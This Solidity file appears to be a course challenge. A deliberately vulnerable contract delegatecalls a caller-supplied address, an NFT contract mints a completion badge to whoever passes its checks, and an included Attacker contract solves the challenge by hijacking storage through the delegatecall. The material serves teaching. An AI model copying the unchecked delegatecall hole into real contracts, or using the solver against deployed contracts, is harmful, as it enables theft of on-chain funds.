// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "base64.sol";

error CourseCompletedNFT__Nope();
error VulnerableContract__Nope();
error VulnerableContract__NopeCall();
error CourseCompletedNFT__NotOwnerOfOtherContract();

interface OtherContract {
    function getOwner() external returns (address);
}

contract VulnerableContract {
    uint256 public s_variable = 0;
    uint256 public s_otherVar = 0;

    function callContract(address yourAddress) public returns (bool) {
        (bool success, ) = yourAddress.delegatecall(
            abi.encodeWithSignature("doSomething()")
        );
        require(success);
        if (s_variable != 123) {
            revert VulnerableContract__NopeCall();
        }
        s_variable = 0;
        return true;
    }

    function callContractAgain(address yourAddress, bytes4 selector)
        public
        returns (bool)
    {
        s_otherVar = s_otherVar + 1;
        (bool success, bytes memory returnData) = yourAddress.call(
            abi.encodeWithSelector(selector)
        );
        require(success);
        if (s_otherVar == 2) {
            return true;
        }
        s_otherVar = 0;
        return false;
    }
}

contract CourseCompletedNFT is ERC721 {
    string public constant TOKEN_IMAGE_URI =
        "ipfs://QmeHo8yoogtNC1aajU6Bn8HEWTGjfv8m7m8ZdDDUzNBXij";
    uint256 private s_tokenCounter;
    uint256 private s_otherVar;
    VulnerableContract private s_vulnerableContract;

    constructor(address vulnerableContractAddress)
        ERC721(
            "Patrick's Hardhat FreeCodeCamp Javascript Tutorial | Course Completed",
            "PHFCC"
        )
    {
        s_tokenCounter = 0;
        s_vulnerableContract = VulnerableContract(vulnerableContractAddress);
    }

    function mintNft(address yourAddress, bytes4 selector)
        public
        returns (uint256)
    {
        if (OtherContract(yourAddress).getOwner() != msg.sender) {
            revert CourseCompletedNFT__NotOwnerOfOtherContract();
        }
        bool returnedOne = s_vulnerableContract.callContract(yourAddress);
        bool returnedTwo = s_vulnerableContract.callContractAgain(
            yourAddress,
            selector
        );

        if (!returnedOne && !returnedTwo) {
            revert CourseCompletedNFT__Nope();
        }

        _safeMint(msg.sender, s_tokenCounter);
        s_tokenCounter = s_tokenCounter + 1;
        return s_tokenCounter;
    }

    function _baseURI() internal pure override returns (string memory) {
        return "data:application/json;base64,";
    }

    function tokenURI(
        uint256 /* tokenId */
    ) public view override returns (string memory) {
        return
            string(
                abi.encodePacked(
                    _baseURI(),
                    Base64.encode(
                        bytes(
                            abi.encodePacked(
                                '{"name":"',
                                name(),
                                '", "description":"This is for completing Patricks FreeCodeCamp Video all the way!!! Be sure to say to me on twitter @PatrickAlphaC with this NFT!", ',
                                '"attributes": [{"trait_type": "Ready to be a Smart Contract Engineer", "value": 100}], "image":"',
                                TOKEN_IMAGE_URI,
                                '"}'
                            )
                        )
                    )
                )
            );
    }

    function getTokenCounter() public view returns (uint256) {
        return s_tokenCounter;
    }
}

contract Attacker {
    uint256 public s_variable;
    uint256 public s_otherVar;
    address public i_owner;
    address public vulnerableContract;

    constructor() {
        i_owner = msg.sender;
        vulnerableContract = 0x62e7C70Ede70bAC1a62b20d2064025b2eB05d9C3;
    }

    function getOwner() public view returns (address) {
        return i_owner;
    }

    function doSomething() public returns (bool) {
        s_variable = 123;
        s_otherVar = 2;
        return true;
    }

    function doSomethingAgain() public returns (bool) {
        (bool success, ) = vulnerableContract.call(
            abi.encodeWithSignature("callContract(address)", address(this))
        );
        return success;
    }

    function getSelector() public view returns (bytes4 selector) {
        bytes memory functionCallData = abi.encodeWithSignature(
            "doSomethingAgain()"
        );
        selector = bytes4(
            bytes.concat(
                functionCallData[0],
                functionCallData[1],
                functionCallData[2],
                functionCallData[3]
            )
        );
    }
}
